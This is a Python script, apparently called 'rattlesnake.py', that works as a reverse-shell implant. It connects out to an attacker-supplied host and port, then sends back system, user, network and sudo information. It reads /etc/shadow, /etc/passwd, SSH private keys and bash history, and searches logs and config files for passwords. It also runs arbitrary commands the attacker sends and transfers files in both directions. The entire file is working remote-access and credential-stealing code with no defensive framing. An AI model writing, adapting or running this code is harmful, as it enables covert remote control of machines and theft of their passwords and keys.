#!/usr/bin/python3
import socket
import subprocess
import sys
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    host = sys.argv[1] # attack IP
    port = int(sys.argv[2]) # attack port
except IndexError:
    print("Usage: ./rattlesnake.py [host] [port]")
HEADER = 64
s.connect((host,port))


class enumeration:

    def systeminfo():
        a = subprocess.getoutput("cat /etc/issue").strip("\n \l")
        b = subprocess.getoutput("cat /proc/version")
        c = subprocess.getoutput("hostname")
        d = subprocess.getoutput("uname -a")
        e = subprocess.getoutput("lshw -short")
        f = subprocess.getoutput("env")
        g = subprocess.getoutput("who")
        r = f"OS:\n{a}\n\nKernel:\n{b}\n\nHostname:\n{c}\n\nUname:\n{d}\n\nlshw:\n{e}\n\nEnv:\n{f}\n\nWho:\n{g}"
        r_len = str(len(r)).encode()
        r_len += b' ' * (HEADER - len(r_len))
        s.send(r_len)
        s.send(r.encode())
        return

    def perminfo():
        a = subprocess.getoutput("whoami")
        b = subprocess.getoutput("id")
        c = subprocess.getoutput("cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null")
        d = subprocess.getoutput("sudo -l -n")
        e = subprocess.getoutput("groups")
        r = f"Whoami:\n{a}\n\nID:\n{b}\n\nSudoers:\n{c}\n\nSudo -l:\n{d}\n\nGroups:\n{e}"
        r_len = str(len(r)).encode()
        r_len += b' ' * (HEADER - len(r_len))
        s.send(r_len)
        s.send(r.encode())
        return

    def fileinfo():
        a = subprocess.getoutput("less | ls /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null") # anyone
        b = subprocess.getoutput("ls /etc/ | awk '$1 ~ /^..w/' 2>/dev/null") # Owner
        c = subprocess.getoutput("ls /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null") # Groups
        d = subprocess.getoutput("less ~/.bash_history") # bash history
        e = subprocess.getoutput("cat /etc/passwd")
        f = subprocess.getoutput("cat /etc/shadow")
        g = subprocess.getoutput("~/.ssh/id_rsa")
        h = subprocess.getoutput("cat ~/.ssh/id_rsa.pub")
        r = f"""Anyone:\n{a}\n\nOwner:\n{b}\n\nGroup:\n{c}\n\nBash history:\n{d}\n\npasswd:\n{e}
\n\nShadow:\n{f}\n\nID_RSA:\n{g}\n\nID_RSA.pub:\n{h}\n\n"""
        r_len = str(len(r)).encode()
        r_len += b' ' * (HEADER - len(r_len))
        s.send(r_len)
        s.send(r.encode())
        return

    def networkinfo():
        a = subprocess.getoutput("cat /etc/network/interfaces")
        b = subprocess.getoutput("iptables -L")
        c = subprocess.getoutput("lsof -i")
        d = subprocess.getoutput("route")
        e = subprocess.getoutput("netstat -antup")
        f = subprocess.getoutput("ip addr")
        r = f"Interfaces:\n{a}\n\nIPTables:\n{b}\n\nLsof:\n{c}\n\nRoute:\n{d}\n\nNestat:\n{e}\n\nIP Addr:\n{f}"
        r_len = str(len(r)).encode()
        r_len += b' ' * (HEADER - len(r_len))
        s.send(r_len)
        s.send(r.encode())
        return

    def userpass():
        a = subprocess.getoutput("find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null")
        b = subprocess.getoutput("find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null")
        c = subprocess.getoutput("cat /etc/shadow 2>/dev/null")
        d = subprocess.getoutput("find / -name credidential.txt -print 2>/dev/null")
        e = subprocess.getoutput("find / -name *.hash -print 2>/dev/null")
        r = f"Log files:\n{a}\n\nConf files:\n{b}\n\nShadow:\n{c}\n\nCreds file:\n{d}\n\n.hash files:\n{e}"
        r_len = str(len(r)).encode()
        r_len += b' ' * (HEADER - len(r_len))
        s.send(r_len)
        s.send(r.encode())
        return

class controls:

    def execcommands():
        try:
            while True:
                cmd_len = s.recv(HEADER).decode()
                cmd_len = int(cmd_len)
                s_cmd=s.recv(cmd_len)
                cmd = s_cmd.decode()
                if cmd.split()[0].lower() in ["cd", "dir"]:
                    try:
                        os.chdir(' '.join(cmd.split()[1:]))
                    except FileNotFoundError as e:
                        c_cmd = str(e)
                    else:
                        c_cmd = os.getcwd()
                elif cmd in ["exit", "quit"]:
                    s.close()
                    quit()
                elif cmd == "back":
                    return

                else:
                    c_cmd = subprocess.getoutput(cmd)
                cmd_len = str(len(c_cmd)).encode()
                cmd_len += b' ' * (HEADER - len(cmd_len))
                s.send(cmd_len)
                s.send(c_cmd.encode())
            return
        except ValueError:
            s.close()
            quit()

    def enumerate(enum):
        enum = enum[0]
        if enum == "1":
            enumeration.systeminfo()
            return

        elif enum == "2":
            enumeration.perminfo()
            return

        elif enum == "3":
            enumeration.fileinfo()
            return

        elif enum == "4":
            enumeration.networkinfo()
            return

        elif enum == "5":
            enumeration.userpass()
            return

    def fileupload():
        filename_len = s.recv(HEADER).decode()
        file_name = s.recv(int(filename_len)).decode()
        try:
            f = open(file_name, 'ab')
            ready_len = str(len("ready")).encode()
            ready_len += b' ' * (HEADER - len(ready_len))
            s.send(ready_len)
            s.send("ready".encode())
        except PermissionError:
            error_len = str(len("Permission error")).encode()
            error_len += b' ' * (HEADER - len(error_len))
            s.send(error_len)
            s.send("Permission error".encode())
            return
        l = s.recv(1024)
        while (l):
            f.write(l)
            l = s.recv(1024)
        f.close()
        return

    def filedownload():
        filepath_len = s.recv(HEADER).decode()
        filepath = s.recv(int(filepath_len)).decode()
        if not os.path.exists(filepath):
            error_len = str(len("Does not exist")).encode()
            error_len += b' ' * (HEADER - len(error_len))
            s.send(error_len)
            s.send("Does not exist".encode())
            return
        try:
            f = open(filepath, 'rb')
        except PermissionError:
            error_len = str(len("Permission error")).encode()
            error_len += b' ' * (HEADER - len(error_len))
            s.send(error_len)
            s.send("Permission error".encode())
            return
        error_len = str(len("ready")).encode()
        error_len += b' ' * (HEADER - len(error_len))
        s.send(error_len)
        s.send("ready".encode())
        filesize = str(os.stat(filepath).st_size)
        filesize_len = str(len(filesize)).encode()
        filesize_len += b' ' * (HEADER - len(filesize_len))
        s.send(filesize_len)
        s.send(filesize.encode())
        l = f.read(1024)
        while (l):
            s.send(l)
            l = f.read(1024)
        f.close()
        return


def main():
    try:
        while True:
            mode_len = s.recv(HEADER).decode()
            mode = s.recv(int(mode_len)).decode()
            if mode == "execcommands":
                controls.execcommands()
                main()

            elif "enumerate" in mode:
                enum = mode.split(":")
                controls.enumerate(enum[1:])
                main()

            elif mode == "fileupload":
                controls.fileupload()
                main()

            elif mode == "filedownload":
                controls.filedownload()
                main()
    except socket.ConnectionResetError:
        exit()




if __name__ == "__main__":
    main()
